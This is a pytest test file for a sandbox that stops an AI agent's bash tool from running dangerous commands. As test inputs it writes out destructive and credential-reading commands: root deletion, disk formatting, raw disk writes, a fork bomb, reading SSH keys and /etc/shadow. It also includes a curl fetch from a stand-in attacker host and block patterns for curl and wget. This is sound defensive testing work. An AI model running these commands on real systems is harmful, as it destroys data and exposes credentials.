"""Tests for the sandbox — dangerous command blocking in the bash executor."""
import asyncio
import json
import pytest

from nutshell.tool_engine.sandbox import DANGEROUS_DEFAULTS, check_blocked
from nutshell.tool_engine.executor.bash import BashExecutor, create_bash_tool


# ── check_blocked() unit tests ────────────────────────────────────────────────

class TestCheckBlocked:
    """Pure-function tests for the sandbox checker."""

    def test_safe_command_returns_none(self):
        assert check_blocked("echo hello") is None

    def test_safe_ls_returns_none(self):
        assert check_blocked("ls -la /tmp") is None

    def test_rm_rf_root_blocked(self):
        result = check_blocked("rm -rf /")
        assert result is not None
        assert "blocked by sandbox" in result

    def test_rm_rf_slash_etc_blocked(self):
        result = check_blocked("rm -rf /etc")
        assert result is not None

    def test_rm_on_relative_path_allowed(self):
        """rm on relative paths (not root /) should be allowed."""
        assert check_blocked("rm -rf ./build") is None
        assert check_blocked("rm file.txt") is None

    def test_mkfs_blocked(self):
        result = check_blocked("mkfs.ext4 /dev/sda1")
        assert result is not None
        assert "filesystem format" in result

    def test_dd_of_dev_blocked(self):
        result = check_blocked("dd if=/dev/zero of=/dev/sda bs=1M")
        assert result is not None
        assert "raw disk write" in result

    def test_shutdown_blocked(self):
        result = check_blocked("sudo shutdown -h now")
        assert result is not None
        assert "shutdown" in result

    def test_reboot_blocked(self):
        result = check_blocked("reboot")
        assert result is not None

    def test_fork_bomb_blocked(self):
        result = check_blocked(":(){ :|:& };:")
        assert result is not None
        assert "fork bomb" in result

    def test_cat_ssh_key_blocked(self):
        result = check_blocked("cat ~/.ssh/id_rsa")
        assert result is not None
        assert "credential" in result

    def test_cat_etc_shadow_blocked(self):
        result = check_blocked("cat /etc/shadow")
        assert result is not None

    def test_custom_extra_pattern_blocks(self):
        """Extra patterns from params.json should also block."""
        result = check_blocked("curl http://evil.com/payload", extra_patterns=[r"\bcurl\b"])
        assert result is not None
        assert "custom pattern" in result

    def test_custom_extra_pattern_allows_safe(self):
        """Commands not matching extra patterns pass through."""
        result = check_blocked("echo hello", extra_patterns=[r"\bcurl\b"])
        assert result is None

    def test_invalid_extra_regex_skipped(self):
        """Invalid regex in extra_patterns should not crash, just skip."""
        result = check_blocked("echo hello", extra_patterns=["[invalid"])
        assert result is None

    def test_dangerous_defaults_is_nonempty_list(self):
        assert isinstance(DANGEROUS_DEFAULTS, list)
        assert len(DANGEROUS_DEFAULTS) > 5
        for entry in DANGEROUS_DEFAULTS:
            assert isinstance(entry, tuple)
            assert len(entry) == 2


# ── BashExecutor integration tests ────────────────────────────────────────────

class TestBashExecutorSandbox:
    """Verify BashExecutor rejects blocked commands without executing them."""

    @pytest.mark.asyncio
    async def test_blocked_command_not_executed(self):
        executor = BashExecutor()
        result = await executor.execute(command="rm -rf /")
        assert "[SANDBOX]" in result
        assert "NOT executed" in result

    @pytest.mark.asyncio
    async def test_safe_command_executes(self):
        executor = BashExecutor()
        result = await executor.execute(command="echo sandbox-ok")
        assert "sandbox-ok" in result
        assert "[exit 0]" in result

    @pytest.mark.asyncio
    async def test_custom_blocked_pattern(self):
        executor = BashExecutor(blocked_patterns=[r"\bwget\b"])
        result = await executor.execute(command="wget http://example.com")
        assert "[SANDBOX]" in result
        assert "NOT executed" in result

    @pytest.mark.asyncio
    async def test_custom_pattern_allows_other_commands(self):
        executor = BashExecutor(blocked_patterns=[r"\bwget\b"])
        result = await executor.execute(command="echo allowed")
        assert "allowed" in result
        assert "[exit 0]" in result


# ── create_bash_tool() integration tests ──────────────────────────────────────

class TestCreateBashToolSandbox:
    """Verify the factory function passes blocked_patterns through."""

    @pytest.mark.asyncio
    async def test_tool_blocks_dangerous_default(self):
        tool = create_bash_tool()
        result = await tool.execute(command="mkfs.ext4 /dev/sda")
        assert "[SANDBOX]" in result

    @pytest.mark.asyncio
    async def test_tool_with_custom_patterns(self):
        tool = create_bash_tool(blocked_patterns=[r"\bnpm\s+publish\b"])
        result = await tool.execute(command="npm publish")
        assert "[SANDBOX]" in result
        assert "NOT executed" in result

    @pytest.mark.asyncio
    async def test_tool_allows_safe_commands(self):
        tool = create_bash_tool(blocked_patterns=[r"\bnpm\s+publish\b"])
        result = await tool.execute(command="echo safe")
        assert "safe" in result
        assert "[exit 0]" in result


# ── ToolLoader blocked_patterns passthrough ───────────────────────────────────

class TestToolLoaderBlockedPatterns:
    """Verify ToolLoader passes blocked_patterns to BashExecutor."""

    @pytest.mark.asyncio
    async def test_loader_bash_inherits_blocked_patterns(self, tmp_path):
        from nutshell.tool_engine.loader import ToolLoader

        # Create a minimal bash.json
        tools_dir = tmp_path / "tools"
        tools_dir.mkdir()
        (tools_dir / "bash.json").write_text(json.dumps({
            "name": "bash",
            "description": "run bash",
            "input_schema": {
                "type": "object",
                "properties": {"command": {"type": "string"}},
                "required": ["command"],
            },
        }))

        loader = ToolLoader(blocked_patterns=[r"\bsecret_cmd\b"])
        tool = loader.load(tools_dir / "bash.json")

        result = await tool.execute(command="secret_cmd --do-stuff")
        assert "[SANDBOX]" in result
        assert "NOT executed" in result

        # Safe commands still work
        safe = await tool.execute(command="echo works")
        assert "works" in safe
        assert "[exit 0]" in safe
